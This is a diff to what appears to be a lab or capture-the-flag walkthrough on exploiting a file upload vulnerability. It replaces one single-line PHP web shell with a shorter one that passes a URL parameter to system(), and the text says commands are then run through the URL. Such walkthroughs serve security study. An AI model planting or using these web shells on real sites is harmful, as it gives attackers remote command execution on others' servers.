@@ -178,7 +178,7 @@ The website has File Upload Vulnerability, you are able to upload a simple backd
 ![Ma GIF Upload](/images/Ma_GIF_2.png)
 
 ```bash
-<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>
+<?php echo "</pre>"; system($_GET['cmd']); ?>
 ```
 After uploading the backdoor, we can execute our commands in the url.
 
